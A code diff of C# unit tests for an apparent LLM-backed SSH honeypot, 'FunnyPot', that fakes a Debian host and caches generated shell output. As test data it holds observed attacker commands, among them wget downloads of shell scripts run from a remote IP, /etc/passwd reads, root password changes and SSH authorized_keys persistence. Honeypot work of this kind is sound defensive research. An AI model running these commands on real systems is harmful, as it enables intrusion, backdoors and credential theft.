@@ -383,675 +383,270 @@ public class ProgramTests
 public class CommandResolverTests
 {
     [Fact]
-    public void NormalizeExecutableName_HandlesObfuscatedBinPath()
+    public void CommandResponseStore_LoadsExactOrdinalKeysAndEmptyResponses()
     {
-        Assert.Equal("uname", CommandResolver.NormalizeExecutableName("/bin/./uname"));
-    }
-
-    [Fact]
-    public void FormatUname_ReturnsOldEolDebianKernelFingerprint()
-    {
-        var response = CommandResolver.FormatUname(new[] { "-s", "-v", "-n", "-r", "-m" });
-
-        Assert.Contains("Linux", response);
-        Assert.Contains("omegablack", response);
-        Assert.Contains("2.6.32-5-amd64", response);
-        Assert.Contains("Jan 16 16:22:28 UTC 2012", response);
-        Assert.Contains("x86_64", response);
-    }
-
-    [Fact]
-    public void FormatCpuInfo_UsesStaticProcCpuinfoShapeWithProvidedValues()
-    {
-        var response = CommandResolver.FormatCpuInfo(new CpuInfoValues
+        var path = CreateStoreFile(new Dictionary<string, string>
         {
-            CpuCount = 2,
-            BogoMips = "50.00",
-            Implementer = "0x41",
-            Architecture = 8,
-            Variant = "0x1",
-            Parts = new List<string> { "0xd82", "0xd80" },
-            Revision = 2
+            ["true"] = "",
+            ["echo A"] = "A"
         });
 
-        Assert.Contains("processor\t: 0", response);
-        Assert.Contains("processor\t: 1", response);
-        Assert.Contains("BogoMIPS\t: 50.00", response);
-        Assert.Contains("Features\t: fp asimd", response);
-        Assert.Contains("CPU implementer\t: 0x41", response);
-        Assert.Contains("CPU architecture: 8", response);
-        Assert.Contains("CPU variant\t: 0x1", response);
-        Assert.Contains("CPU part\t: 0xd82", response);
-        Assert.Contains("CPU part\t: 0xd80", response);
-        Assert.Contains("CPU revision\t: 2", response);
-    }
-
-    [Fact]
-    public void TryParseCpuInfoValues_ReadsLlmJsonValues()
-    {
-        var parsed = CommandResolver.TryParseCpuInfoValues(
-            "```json\n{\"cpuCount\":2,\"bogoMips\":\"51.20\",\"implementer\":\"0x41\",\"architecture\":8,\"variant\":\"0x0\",\"parts\":[\"0xd82\",\"0xd80\"],\"revision\":1}\n```",
-            out var values);
-
-        Assert.True(parsed);
-        Assert.Equal(2, values.CpuCount);
-        Assert.Equal("51.20", values.BogoMips);
-        Assert.Equal(new[] { "0xd82", "0xd80" }, values.Parts);
-    }
-
-    [Fact]
-    public void FormatUptimePretty_NeverReportsShortUptime()
-    {
-        SyntheticHostClock.ResetForTests(DateTime.UtcNow.AddDays(-21).AddHours(-4).AddMinutes(-9));
-
         try
         {
-            var response = CommandResolver.FormatUptime(new[] { "-p" });
+            var store = CommandResponseStore.Load(path);
 
-            Assert.Contains("up 21 days", response);
-            Assert.Contains("4 hours", response);
+            Assert.True(store.TryGet("true", out var empty));
+            Assert.Equal("", empty.Response);
+            Assert.True(store.TryGet("echo A", out var exact));
+            Assert.Equal("A", exact.Response);
+            Assert.False(store.TryGet("echo a", out _));
+            Assert.False(store.TryGet("echo A ", out _));
         }
         finally
         {
-            SyntheticHostClock.ResetForTests();
+            File.Delete(path);
         }
     }
 
     [Fact]
-    public void SyntheticHostClock_PersistsBootTimeState()
+    public async Task CommandResponseStore_LearnsAndPersistsLlmResponses()
     {
-        var tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
-        var statePath = Path.Combine(tempDir, "persona_state.json");
-        var now = DateTime.UtcNow;
-
+        var path = CreateStoreFile(new Dictionary<string, string>());
         try
         {
-            SyntheticHostClock.ResetForTests(statePath: statePath);
-            var first = SyntheticHostClock.GetUptime(now);
-            SyntheticHostClock.ResetForTests(statePath: statePath);
-            var second = SyntheticHostClock.GetUptime(now.AddMinutes(5));
+            var store = CommandResponseStore.Load(path);
 
-            Assert.True(File.Exists(statePath));
-            Assert.InRange(first.TotalDays, SyntheticHostClock.MinInitialUptimeDays, SyntheticHostClock.MaxInitialUptimeDays + 2);
-            Assert.True(second > first);
+            Assert.True(await store.TryLearnAsync("new-command", "generated", "test-model"));
+            Assert.True(store.TryGet("new-command", out var learned));
+            Assert.Equal("generated", learned.Response);
+            Assert.Equal("llm", learned.Origin);
+            Assert.Equal("test-model", learned.LlmModel);
+            Assert.NotNull(learned.UpdatedAtUtc);
+
+            var reloaded = CommandResponseStore.Load(path);
+            Assert.True(reloaded.TryGet("new-command", out var persisted));
+            Assert.Equal("generated", persisted.Response);
+            Assert.Equal("test-model", persisted.LlmModel);
         }
         finally
         {
-            SyntheticHostClock.ResetForTests();
-            if (Directory.Exists(tempDir))
-                Directory.Delete(tempDir, recursive: true);
+            File.Delete(path);
+            File.Delete(path + ".tmp");
+        }
+    }
+
+    [Fact]
+    public async Task CommandResponseStore_ConcurrentUpdatesDoNotLoseEntries()
+    {
+        var path = CreateStoreFile(new Dictionary<string, string>());
+        try
+        {
+            var store = CommandResponseStore.Load(path);
+            await Task.WhenAll(Enumerable.Range(0, 12)
+                .Select(index => store.TryLearnAsync($"command-{index}", $"response-{index}", "test-model")));
+
+            Assert.Equal(12, store.Count);
+            Assert.Equal(12, CommandResponseStore.Load(path).Count);
+            using var _ = System.Text.Json.JsonDocument.Parse(File.ReadAllText(path));
+        }
+        finally
+        {
+            File.Delete(path);
+            File.Delete(path + ".tmp");
+        }
+    }
+
+    [Fact]
+    public async Task ResolveCommand_CacheHitDoesNotCallLlm()
+    {
+        var path = CreateStoreFile(new Dictionary<string, string> { ["uname -a"] = "cached uname" });
+        try
+        {
+            Program.CommandResponses = CommandResponseStore.Load(path);
+            var calls = 0;
+            var result = await CommandResolver.ResolveCommandAsync(
+                "uname -a",
+                "session",
+                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
+                [],
+                CancellationToken.None,
+                (_, _) =>
+                {
+                    calls++;
+                    return Task.FromResult(("unexpected", 1, 1, 2, "test-model"));
+                });
+
+            Assert.Equal("cached uname", result.response);
+            Assert.Equal("cache", result.responseSource);
+            Assert.True(result.usedStatic);
+            Assert.Equal(0, calls);
+        }
+        finally
+        {
+            File.Delete(path);
+        }
+    }
+
+    [Fact]
+    public async Task ResolveCommand_CacheMissCallsLlmAndLearnsResponse()
+    {
+        var path = CreateStoreFile(new Dictionary<string, string>());
+        try
+        {
+            Program.CommandResponses = CommandResponseStore.Load(path);
+            var calls = 0;
+            Task<(string response, int promptTokens, int completionTokens, int totalTokens, string model)> Provider(
+                List<ChatRequestData.ChatMessage> _, CancellationToken __)
+            {
+                calls++;
+                return Task.FromResult(("generated output", 4, 2, 6, "test-model"));
+            }
+
+            var first = await CommandResolver.ResolveCommandAsync(
+                "uncached command", "session", FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")), [], CancellationToken.None, Provider);
+            var second = await CommandResolver.ResolveCommandAsync(
+                "uncached command", "session", FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")), [], CancellationToken.None, Provider);
+
+            Assert.Equal("generated output", first.response);
+            Assert.Equal("llm", first.responseSource);
+            Assert.False(first.usedStatic);
+            Assert.Equal("generated output", second.response);
+            Assert.Equal("cache", second.responseSource);
+            Assert.Equal("test-model", second.llmModel);
+            Assert.Equal(1, calls);
+        }
+        finally
+        {
+            File.Delete(path);
+            File.Delete(path + ".tmp");
+        }
+    }
+
+    [Fact]
+    public async Task ResolveCommand_DoesNotLearnModelFailures()
+    {
+        var path = CreateStoreFile(new Dictionary<string, string>());
+        try
+        {
+            Program.CommandResponses = CommandResponseStore.Load(path);
+            var result = await CommandResolver.ResolveCommandAsync(
+                "failed command",
+                "session",
+                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
+                [],
+                CancellationToken.None,
+                (_, _) => Task.FromResult(("[api error] unavailable", 0, 0, 0, "test-model")));
+
+            Assert.Equal("[api error] unavailable", result.response);
+            Assert.Equal("llm", result.responseSource);
+            Assert.False(Program.CommandResponses.TryGet("failed command", out _));
+        }
+        finally
+        {
+            File.Delete(path);
+        }
+    }
+
+    [Fact]
+    public async Task ResolveCommand_RepairsCompoundOutputBeforeLearning()
+    {
+        var path = CreateStoreFile(new Dictionary<string, string>());
+        try
+        {
+            Program.CommandResponses = CommandResponseStore.Load(path);
+            var responses = new Queue<(string response, int promptTokens, int completionTokens, int totalTokens, string model)>(
+            [
+                ("2", 3, 1, 4, "first-model"),
+                ("ARCH:x86_64\nCPUS:2", 5, 2, 7, "repair-model")
+            ]);
+            var history = new List<ChatRequestData.ChatMessage>();
+            const string command = "arch=$(uname -m); cpus=$(nproc); echo \"ARCH:$arch\"; echo \"CPUS:$cpus\"";
+
+            var result = await CommandResolver.ResolveCommandAsync(
+                command,
+                "session",
+                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
+                history,
+                CancellationToken.None,
+                (_, _) => Task.FromResult(responses.Dequeue()));
+
+            Assert.Equal("ARCH:x86_64\r\nCPUS:2", result.response);
+            Assert.Equal("repair-model", result.llmModel);
+            Assert.True(Program.CommandResponses.TryGet(command, out var learned));
+            Assert.Equal("repair-model", learned.LlmModel);
+            Assert.Empty(history);
+        }
+        finally
+        {
+            File.Delete(path);
+        }
+    }
+
+    [Fact]
+    public async Task ResolveCommand_ScpRemainsAProtocolException()
+    {
+        var path = CreateStoreFile(new Dictionary<string, string>());
+        try
+        {
+            Program.CommandResponses = CommandResponseStore.Load(path);
+            var calls = 0;
+            var result = await CommandResolver.ResolveCommandAsync(
+                "scp -t /tmp/file",
+                "session",
+                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
+                [],
+                CancellationToken.None,
+                (_, _) =>
+                {
+                    calls++;
+                    return Task.FromResult(("unexpected", 0, 0, 0, "test-model"));
+                });
+
+            Assert.Equal("", result.response);
+            Assert.Equal("scp", result.responseSource);
+            Assert.Equal(0, calls);
+        }
+        finally
+        {
+            File.Delete(path);
         }
     }
 
     [Theory]
-    [InlineData("(Empty response)")]
-    [InlineData("No output")]
-    [InlineData("No output.")]
-    public void NormalizeTerminalOutput_TreatsEmptyOutputMarkersAsNoOutput(string response)
+    [InlineData("cat /etc/passwd && uname -a", true)]
+    [InlineData("echo 'a;b'", false)]
+    [InlineData("echo \"a|b\"", false)]
+    public void IsCompoundShellCommand_HandlesQuotedOperators(string command, bool expected)
     {
-        Assert.Equal("", Program.NormalizeTerminalOutput(response));
+        Assert.Equal(expected, CommandResolver.IsCompoundShellCommand(command));
     }
 
     [Fact]
-    public void BuildSystemPrompt_InstructsLlmAboutRedirectionAndBinaryCatOutput()
+    public void CommandResponseSeed_IsAValidJsonDictionary()
     {
-        var prompt = Program.BuildSystemPrompt("remote");
+        var path = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "../../../../FunnyPot/data/command_responses.json"));
+        var store = CommandResponseStore.Load(path);
 
-        Assert.Contains("echo 1 > /dev/null", prompt);
-        Assert.Contains("following `&&` command should still run", prompt);
-        Assert.Contains("/bin/echo", prompt);
-        Assert.Contains("\\x7fELF", prompt);
-        Assert.Contains("Never replace binary file contents with only the path or a single `/`", prompt);
-        Assert.Contains("Installed command baseline", prompt);
-        Assert.Contains("pkill", prompt);
-        Assert.Contains("Never answer `bash: <one of these>: command not found`", prompt);
+        Assert.True(store.Count >= 100);
+        Assert.True(store.TryGet("cd ~; chattr -ia .ssh; lockr -ia .ssh", out var response));
+        Assert.Contains("while trying to stat .ssh", response.Response);
     }
 
     [Fact]
-    public void BuildSystemPrompt_LocksMetaResponseAndReservesStandardCommandNotFound()
+    public void NormalizeTerminalOutput_RemovesShellPrompt()
     {
-        var prompt = Program.BuildSystemPrompt("remote");
+        var normalized = Program.NormalizeTerminalOutput("remote@omegablack:/tmp$ uname -a\n");
 
-        Assert.Contains("bash: who are you: command not found", prompt);
-        Assert.Contains("meta-questions", prompt);
-        Assert.Contains("bash: <command>: command not found", prompt);
+        Assert.Equal("uname -a", normalized);
     }
 
     [Fact]
-    public void BuildSystemPrompt_GivesPlausibleExamplesForObservedAttackerCommands()
+    public void BuildCommandUserPrompt_RequiresRawTerminalOutput()
     {
-        var prompt = Program.BuildSystemPrompt("remote");
-
-        Assert.Contains("`echo Hi | cat -n`", prompt);
-        Assert.Contains("`1\\tHi`", prompt);
-        Assert.Contains("`ifconfig`", prompt);
-        Assert.Contains("`lspci | grep VGA | cut -f5- -d ' '`", prompt);
-        Assert.Contains("`locate <pattern>`", prompt);
-        Assert.Contains("`top` returns a compact top screen", prompt);
-        Assert.Contains("`lscpu | grep Model` returns only the matching", prompt);
-        Assert.Contains("cat /proc/cpuinfo | grep name | wc -l", prompt);
-        Assert.Contains("returns only a small integer", prompt);
-        Assert.Contains("Do not output parser traces", prompt);
-        Assert.Contains("Generated maintenance artifact", prompt);
-        Assert.Contains("pkill -9 secure.sh", prompt);
-    }
-
-    [Fact]
-    public void BuildCommandUserPrompt_TreatsCommandAsLiteralBashInput()
-    {
-        var prompt = Program.BuildCommandUserPrompt("cat /proc/cpuinfo | grep name | wc -l");
+        var prompt = Program.BuildCommandUserPrompt("uname -a");
 
         Assert.Contains("Execute this exact Bash command", prompt);
-        Assert.Contains("command_kind: chained", prompt);
-        Assert.Contains("Evaluate the COMPLETE shell program", prompt);
-        Assert.Contains("Command substitutions", prompt);
-        Assert.Contains("Synthetic host facts", prompt);
-        Assert.Contains("Worked example", prompt);
-        Assert.Contains("output only the final visible terminal stdout/stderr", prompt);
-        Assert.Contains("Do not explain, reason aloud", prompt);
-        Assert.Contains("show parser steps", prompt);
         Assert.Contains("raw terminal stdout/stderr only", prompt);
-        Assert.Contains("no reasoning", prompt);
-        Assert.Contains("cat /proc/cpuinfo | grep name | wc -l", prompt);
-    }
-
-    [Fact]
-    public void StaticResponseStore_IfconfigHasPlausibleNetworkDump()
-    {
-        var response = StaticResponseStore.GetResponse("ifconfig", "/root");
-
-        Assert.NotNull(response);
-        Assert.Contains("eth0", response);
-        Assert.Contains("Link encap:Ethernet", response);
-        Assert.Contains("inet addr:", response);
-        Assert.Contains("lo", response);
-    }
-
-    [Fact]
-    public void IsModelFailureResponse_DetectsApiAndNetworkErrors()
-    {
-        Assert.True(CommandResolver.IsModelFailureResponse("[api error] 401: missing key"));
-        Assert.True(CommandResolver.IsModelFailureResponse("[network error] timeout"));
-        Assert.False(CommandResolver.IsModelFailureResponse("bash: nope: command not found"));
-    }
-
-    [Theory]
-    [InlineData("cd /tmp || cd /run; wget http://45.81.234.64/10Gbins.sh; chmod 777 10Gbins.sh; sh 10Gbins.sh")]
-    [InlineData("ps -ef | grep '[Mm]iner'")]
-    [InlineData("cat /etc/passwd && uname -a")]
-    public void IsCompoundShellCommand_DetectsShellOperators(string command)
-    {
-        Assert.True(CommandResolver.IsCompoundShellCommand(command));
-    }
-
-    [Theory]
-    [InlineData("echo 'a;b'")]
-    [InlineData("echo \"a|b\"")]
-    [InlineData("echo 'a&&b'")]
-    public void IsCompoundShellCommand_IgnoresOperatorsInsideQuotes(string command)
-    {
-        Assert.False(CommandResolver.IsCompoundShellCommand(command));
-    }
-
-    [Theory]
-    [InlineData("cd /tmp")]
-    [InlineData("uname -a")]
-    [InlineData("ls -la")]
-    public void IsCompoundShellCommand_IgnoresSimpleCommands(string command)
-    {
-        Assert.False(CommandResolver.IsCompoundShellCommand(command));
-    }
-
-    [Theory]
-    [InlineData("cd /tmp", "BuiltIn")]
-    [InlineData("pwd", "BuiltIn")]
-    [InlineData("uname -a", "BuiltIn")]
-    [InlineData("echo hello", "BuiltIn")]
-    [InlineData("/bin/./uname -a", "BuiltIn")]
-    [InlineData("locate D877F783D5D3EF8Cs", "BuiltIn")]
-    [InlineData("cat /etc/passwd", "StaticDataset")]
-    [InlineData("ps", "StaticDataset")]
-    [InlineData("ls /var/log", "StaticDataset")]
-    [InlineData("ifconfig", "StaticDataset")]
-    [InlineData("scp /tmp/a remote:/tmp/a", "BuiltIn")]
-    public void ClassifyCommand_ShortCircuitsSimpleCommands(string command, string expectedPath)
-    {
-        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
-
-        var path = CommandResolver.ClassifyCommand(command, fs);
-
-        Assert.Equal(expectedPath, path.ToString());
-    }
-
-    [Fact]
-    public async Task ResolveCommand_ReturnsLinuxErrorForRouterOsProbe()
-    {
-        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
-        var history = new List<ChatRequestData.ChatMessage>();
-
-        var (response, usedStatic, rateLimited, promptTokens, completionTokens, _, _) = await CommandResolver.ResolveCommandAsync(
-            "/ip cloud print",
-            Guid.NewGuid().ToString("N"),
-            Guid.NewGuid().ToString("N"),
-            fs,
-            history,
-            CancellationToken.None);
-
-        Assert.Equal("bash: /ip: No such file or directory", response);
-        Assert.True(usedStatic);
-        Assert.False(rateLimited);
-        Assert.Equal(0, promptTokens);
-        Assert.Equal(0, completionTokens);
-    }
-
-    [Theory]
-    [InlineData("cd /tmp || cd /run || cd /; wget http://45.81.234.64/10Gbins.sh; chmod 777 10Gbins.sh; sh 10Gbins.sh")]
-    [InlineData("ps -ef | grep '[Mm]iner'")]
-    [InlineData("cat /etc/passwd && uname -a")]
-    [InlineData("ls /var/log; cat /etc/passwd")]
-    [InlineData("wget http://example.com/a.sh -O /tmp/a.sh && sh /tmp/a.sh")]
-    [InlineData("find / -perm -4000 -type f 2>/dev/null")]
-    [InlineData("python3 -c 'import os; print(os.getuid())'")]
-    public void ClassifyCommand_PassesComplexOrUnknownCommandsToLlm(string command)
-    {
-        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
-
-        var path = CommandResolver.ClassifyCommand(command, fs);
-
-        Assert.Equal(CommandResolver.CommandResolutionPath.Llm, path);
-    }
-
-    [Fact]
-    public void ClassifyCommand_DoesNotMutateFilesystemForCdClassification()
-    {
-        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
-
-        var path = CommandResolver.ClassifyCommand("cd /tmp", fs);
-
-        Assert.Equal(CommandResolver.CommandResolutionPath.BuiltIn, path);
-        Assert.Equal("/home/remote", fs.CurrentDirectory);
-    }
-
-    [Fact]
-    public void FakeFileSystem_ResolveParentFromTopLevelReturnsRoot()
-    {
-        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
-        fs.ChangeDirectory("/home");
-
-        Assert.Equal("/", fs.ResolvePath(".."));
-    }
-
-    [Theory]
-    [InlineData("/bin/echo")]
-    [InlineData("/bin/bash")]
-    [InlineData("/usr/bin/curl")]
-    [InlineData("/sbin/ip")]
-    [InlineData("/usr/sbin/cron")]
-    [InlineData("/usr/local/bin/deploy.sh")]
-    [InlineData("/lib/ld-linux-x86-64.so.2")]
-    [InlineData("/usr/lib/x86_64-linux-gnu/libssl.so.1.0.0")]
-    public void FakeFileSystem_ReportsReasonableFilesAsPresent(string path)
-    {
-        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
-
-        Assert.True(fs.FileExists(path));
-    }
-
-    [Theory]
-    [InlineData("cat /bin/echo")]
-    [InlineData("cat /bin/bash")]
-    [InlineData("cat /usr/bin/curl")]
-    [InlineData("cat /sbin/ip")]
-    [InlineData("cat /lib/ld-linux-x86-64.so.2")]
-    [InlineData("/bin/cat /bin/echo")]
-    [InlineData("/usr/bin/cat /bin/ls")]
-    public void IsBinaryExecutableCatCommand_DetectsAnyBinaryPath(string command)
-    {
-        Assert.True(CommandResolver.IsBinaryExecutableCatCommand(command));
-    }
-
-    [Theory]
-    [InlineData("cat /etc/passwd")]
-    [InlineData("cat /var/log/auth.log")]
-    [InlineData("cat /home/secretOps/.env")]
-    [InlineData("cat /opt/app/config.yml")]
-    public void IsBinaryExecutableCatCommand_DoesNotMatchRegularFiles(string command)
-    {
-        Assert.False(CommandResolver.IsBinaryExecutableCatCommand(command));
-    }
-
-    [Fact]
-    public void FakeFileSystem_ListsRealisticContentsForEnrichedPaths()
-    {
-        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
-
-        var opt = fs.ListDirectory("/opt");
-        Assert.Contains("app", opt);
-        Assert.Contains("monitoring", opt);
-
-        var srvWww = fs.ListDirectory("/srv/www/html");
-        Assert.Contains("index.html", srvWww);
-
-        var varLog = fs.ListDirectory("/var/log");
-        Assert.Contains("auth.log", varLog);
-        Assert.Contains("fail2ban.log", varLog);
-    }
-
-    [Fact]
-    public void StripShellQuotes_RemovesSimpleShellQuotes()
-    {
-        Assert.Equal("hello world", CommandResolver.StripShellQuotes("\"hello world\""));
-        Assert.Equal("hello world", CommandResolver.StripShellQuotes("'hello world'"));
-    }
-
-    [Theory]
-    [InlineData("echo \"hello world\"", "hello world")]
-    [InlineData("type", "type: usage")]
-    [InlineData("which", "Usage: which")]
-    [InlineData("getconf", "Usage: getconf")]
-    [InlineData("who", "remote   pts/0")]
-    [InlineData("locate D877F783D5D3EF8Cs", "Electrum")]
-    [InlineData("locate wallet", "/opt/app/data/wallet")]
-    [InlineData("locate ab", "at least 3 characters")]
-    public async Task ResolveCommand_BuiltInsReturnExpectedOutput(string command, string expectedFragment)
-    {
-        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
-        var history = new List<ChatRequestData.ChatMessage>();
-
-        var (response, _, _, _, _, _, _) = await CommandResolver.ResolveCommandAsync(
-            command,
-            Guid.NewGuid().ToString("N"),
-            Guid.NewGuid().ToString("N"),
-            fs,
-            history,
-            CancellationToken.None);
-
-        Assert.Contains(expectedFragment, response);
-    }
-
-    [Fact]
-    public void GenerateLocalFallbackResponse_ReturnsShellOutputForCompoundCommands()
-    {
-        var response = CommandResolver.GenerateLocalFallbackResponse("cat /etc/passwd | grep root; wget http://example.com/a.sh -O /tmp/a.sh");
-
-        Assert.Contains("root:x:0:0:root:/root:/bin/bash", response);
-        Assert.DoesNotContain("api error", response, StringComparison.OrdinalIgnoreCase);
-        Assert.DoesNotContain("network error", response, StringComparison.OrdinalIgnoreCase);
-    }
-
-    [Theory]
-    [InlineData("top", "Tasks:")]
-    [InlineData("lscpu | grep Model", "Model name:")]
-    [InlineData("rm -rf /tmp/secure.sh; pkill -9 secure.sh; echo > /etc/hosts.deny", "")]
-    public void GenerateLocalFallbackResponse_KeepsCommonUtilitiesAvailable(string command, string expected)
-    {
-        var response = CommandResolver.GenerateLocalFallbackResponse(command);
-
-        Assert.DoesNotContain("command not found", response, StringComparison.OrdinalIgnoreCase);
-        if (expected.Length == 0)
-            Assert.Equal("", response);
-        else
-            Assert.Contains(expected, response);
-    }
-
-    [Theory]
-    [InlineData("echo 'password' | sudo -S nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c '^processor' /proc/cpuinfo 2>/dev/null", "2")]
-    [InlineData("cat /proc/cpuinfo | grep name | wc -l", "2")]
-    [InlineData("cat /proc/cpuinfo | grep model | grep name | wc -l", "2")]
-    [InlineData("cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'", "Platinum 8259CL")]
-    [InlineData("lscpu | grep Model", "Model name:")]
-    [InlineData("free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'", "7888 2401 3170 229 2308 5081")]
-    [InlineData("df -h | head -n 2 | awk 'FNR == 2 {print $2;}'", "49G")]
-    [InlineData("ls -lh $(which ls)", "/bin/ls")]
-    [InlineData("crontab -l", "no crontab for remote")]
-    public void FrequentCommandResponse_ReturnsConsistentHostOutput(string command, string expected)
-    {
-        Assert.True(CommandResolver.TryGenerateFrequentCommandResponse(command, out var response));
-        Assert.Contains(expected, response);
-    }
-
-    [Theory]
-    [InlineData("cd ~; chattr -ia .ssh; lockr -ia .ssh")]
-    [InlineData("cd ~ && rm -rf .ssh && mkdir .ssh && echo 'ssh-rsa key' >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~")]
-    public void FrequentCommandResponse_PersistenceSetupSucceedsSilently(string command)
-    {
-        Assert.True(CommandResolver.TryGenerateFrequentCommandResponse(command, out var response));
-        Assert.Equal("", response);
-    }
-
-    [Fact]
-    public void CompoundPrompt_ExtractsAndRequiresVisibleLabels()
-    {
-        var command = "arch=$(uname -m); cpus=$(nproc); echo \"ARCH:$arch\"; echo \"CPUS:$cpus\"";
-
-        var labels = Program.ExtractExpectedOutputLabels(command);
-        var prompt = Program.BuildCommandUserPrompt(command);
-
-        Assert.Equal(new[] { "ARCH:", "CPUS:" }, labels);
-        Assert.Contains("[\"ARCH:\",\"CPUS:\"]", prompt);
-        Assert.False(Program.ContainsExpectedOutputLabels("2", labels));
-        Assert.True(Program.ContainsExpectedOutputLabels("ARCH:x86_64\r\nCPUS:2", labels));
-    }
-
-    [Fact]
-    public void CompoundRepairPrompt_ExplainsIntermediateValueFailure()
-    {
-        var command = "uname=$(uname -a); cpus=$(nproc); echo \"UNAME:$uname\"; echo \"CPUS:$cpus\"";
-        var labels = Program.ExtractExpectedOutputLabels(command);
-
-        var repair = Program.BuildCompoundRepairPrompt(command, "2", labels);
-
-        Assert.Contains("structurally incomplete", repair);
-        Assert.Contains("intermediate subcommand value", repair);
-        Assert.Contains("UNAME:", repair);
-        Assert.Contains("CPUS:", repair);
-        Assert.Contains(command, repair);
-    }
-
-    [Fact]
-    public void CompoundCache_RequiresWholeCommandOutputStructure()
-    {
-        var command = "arch=$(uname -m); cpus=$(nproc); echo \"ARCH:$arch\"; echo \"CPUS:$cpus\"";
-
-        Assert.False(CommandResolver.IsCachedResponseUsable(command, "2"));
-        Assert.True(CommandResolver.IsCachedResponseUsable(command, "ARCH:x86_64\r\nCPUS:2"));
-    }
-
-    [Theory]
-    [InlineData("echo -e \"old\\nnew\\nnew\"|passwd|bash", "password unchanged")]
-    [InlineData("echo \"root:new-password\"|chpasswd|bash", "Authentication failure")]
-    [InlineData("cat /etc/centos-release 2>/dev/null | head -1", "No such file or directory")]
-    [InlineData("cat /etc/debian_version 2>/dev/null | head -1", "6.0.10")]
-    [InlineData("df -h / | awk 'NR==2 {print $4}'", "39G")]
-    [InlineData("free -h | grep Mem | awk '{print $2}'", "7.7G")]
-    [InlineData("ps -e --no-headers | wc -l", "89")]
-    [InlineData("who | wc -l", "1")]
-    [InlineData("netstat -tulpn 2>/dev/null | grep LISTEN | head -20", "1247/sshd")]
-    [InlineData("ps -ef | grep '[Mm]iner'", "xmrig")]
-    public void FrequentCommandResponse_RepairsRemainingObservedFamilies(string command, string expected)
-    {
-        Assert.True(CommandResolver.TryGenerateFrequentCommandResponse(command, out var response));
-        Assert.Contains(expected, response);
-    }
-
-    [Fact]
-    public void FrequentCommandResponse_NvidiaProbeIsConsistentlyEmptyOnAmdHost()
-    {
-        Assert.True(CommandResolver.TryGenerateFrequentCommandResponse(
-            "nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | head -1",
-            out var response));
-        Assert.Equal("", response);
-    }
-
-    [Fact]
-    public async Task ResolveCommand_DirectCpuInfoUsesConsistentTwoCpuProfile()
-    {
-        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
-
-        var (response, _, _, promptTokens, completionTokens, _, source) = await CommandResolver.ResolveCommandAsync(
-            "cat /proc/cpuinfo",
-            Guid.NewGuid().ToString("N"),
-            Guid.NewGuid().ToString("N"),
-            fs,
-            new List<ChatRequestData.ChatMessage>(),
-            CancellationToken.None);
-
-        Assert.Equal(2, response.Split("processor\t:", StringSplitOptions.None).Length - 1);
-        Assert.Contains("Platinum 8259CL", response);
-        Assert.Equal(0, promptTokens);
-        Assert.Equal(0, completionTokens);
-        Assert.Equal("local host profile", source);
-    }
-
-    [Fact]
-    public async Task ResolveCommand_IpInfoReturnsSyntheticNetworkIdentity()
-    {
-        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
-
-        var (response, _, _, _, _, _, source) = await CommandResolver.ResolveCommandAsync(
-            "curl -s ipinfo.io/json",
-            Guid.NewGuid().ToString("N"),
-            Guid.NewGuid().ToString("N"),
-            fs,
-            new List<ChatRequestData.ChatMessage>(),
-            CancellationToken.None);
-
-        Assert.Contains("198.51.100.42", response);
-        Assert.Equal("built-in", source);
-    }
-
-    [Fact]
-    public async Task ResolveCommand_MemoryAndTopAgreeOnHostCapacity()
-    {
-        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
-        var session = Guid.NewGuid().ToString("N");
-        var history = new List<ChatRequestData.ChatMessage>();
-
-        var (memInfo, _, _, _, _, _, _) = await CommandResolver.ResolveCommandAsync(
-            "cat /proc/meminfo", session, session, fs, history, CancellationToken.None);
-        var (top, _, _, _, _, _, _) = await CommandResolver.ResolveCommandAsync(
-            "top", session, session, fs, history, CancellationToken.None);
-
-        Assert.Contains("MemTotal:        8077312 kB", memInfo);
-        Assert.Contains("7888.0 total", top);
-        Assert.Contains("Tasks:  89 total", top);
-    }
-
-    [Fact]
-    public void CommandResponseCache_DoesNotStorePasswordChangingCommands()
-    {
-        var command = $"echo root:{Guid.NewGuid():N} | chpasswd | bash";
-
-        CommandResponseCache.Store(command, "password updated successfully", "test-model");
-
-        Assert.False(CommandResponseCache.TryGet(command, out _));
-    }
-
-    [Theory]
-    [InlineData("cd ~; chattr -ia .ssh; lockr -ia .ssh")]
-    [InlineData("cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2 attacker\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~")]
-    public void ClassifyCommand_PersistenceSetupChainsRouteToLlm(string command)
-    {
-        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
-
-        var path = CommandResolver.ClassifyCommand(command, fs);
-
-        Assert.Equal(CommandResolver.CommandResolutionPath.Llm, path);
-    }
-
-    [Fact]
-    public async Task ResolveCommand_RemembersDownloadedAndWrittenFiles()
-    {
